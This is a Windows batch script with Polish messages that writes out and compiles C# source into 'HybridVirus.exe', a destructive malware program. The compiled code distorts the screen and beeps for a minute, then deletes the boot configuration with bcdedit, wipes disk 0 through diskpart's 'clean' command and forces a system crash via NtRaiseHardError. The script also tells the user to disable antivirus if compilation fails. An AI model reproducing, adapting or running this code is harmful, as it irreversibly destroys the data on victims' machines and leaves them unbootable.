@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (echo URUCHOM JAKO ADMIN! & pause & exit)

set "d=%userprofile%\Desktop\lol-main"
if not exist "%d%" mkdir "%d%"
cd /d "%d%"

echo [*] Generowanie kodu...
:: Czyszczenie starego pliku
copy /y nul source.cs > nul

:: Wpisujemy kod linijka po linijce (bezpieczniejsza metoda)
echo using System; >> source.cs
echo using System.Drawing; >> source.cs
echo using System.Runtime.InteropServices; >> source.cs
echo using System.Threading; >> source.cs
echo using System.Windows.Forms; >> source.cs
echo using System.Diagnostics; >> source.cs
echo using Microsoft.Win32; >> source.cs
echo public class Virus { >> source.cs
echo [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h^); >> source.cs
echo [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int sx, int sy, uint op^); >> source.cs
echo [DllImport("user32.dll")] public static extern int GetSystemMetrics(int n^); >> source.cs
echo [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int p, bool e, bool c, out bool o^); >> source.cs
echo [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint h, uint a, uint b, IntPtr c, uint d, out uint e^); >> source.cs
echo [STAThread] public static void Main(^) { >> source.cs
echo new Thread(PayloadGDI^).Start(^); >> source.cs
echo new Thread(PayloadAudio^).Start(^); >> source.cs
echo Thread.Sleep(60000^); >> source.cs
echo Destruction(^); } >> source.cs
echo static void PayloadGDI(^) { IntPtr hdc = GetDC(IntPtr.Zero^); int w = GetSystemMetrics(0^), h = GetSystemMetrics(1^); Random r = new Random(^); >> source.cs
echo while(true^) { BitBlt(hdc, r.Next(-10, 11^), r.Next(-10, 11^), w, h, hdc, 0, 0, 0x00CC0020^); >> source.cs
echo if(r.Next(100^) ^> 95^) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00660046^); >> source.cs
echo if(r.Next(10^) ^> 8^) Graphics.FromHdc(hdc^).DrawIcon(SystemIcons.Error, r.Next(w^), r.Next(h^)^); >> source.cs
echo Thread.Sleep(10^); } } >> source.cs
echo static void PayloadAudio(^) { Random r = new Random(^); while(true^) { Console.Beep(r.Next(200, 2000^), 100^); Thread.Sleep(400^); } } >> source.cs
echo static void Destruction(^) { try { >> source.cs
echo Process.Start(new ProcessStartInfo("bcdedit", "/delete {current} /f"^) { WindowStyle = ProcessWindowStyle.Hidden }^); >> source.cs
echo System.IO.File.WriteAllText("s.txt", "select disk 0\nclean"^); >> source.cs
echo Process.Start(new ProcessStartInfo("diskpart", "/s s.txt"^) { WindowStyle = ProcessWindowStyle.Hidden }^); >> source.cs
echo bool o; uint e; RtlAdjustPrivilege(19, true, false, out o^); >> source.cs
echo NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out e^); >> source.cs
echo } catch { Process.Start("cmd.exe", "/c taskkill /f /im svchost.exe"^); } } } >> source.cs

echo [*] Kompilacja...
set "c=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%c%" set "c=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

"%c%" /target:winexe /out:HybridVirus.exe /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.dll source.cs

if exist "HybridVirus.exe" (
    echo [+] SUKCES! HybridVirus.exe jest w lol-main.
    del source.cs
) else (
    echo [!] BLAD KOMPILACJI. Sprawdz czy masz wylaczony Antywirus.
)
pause
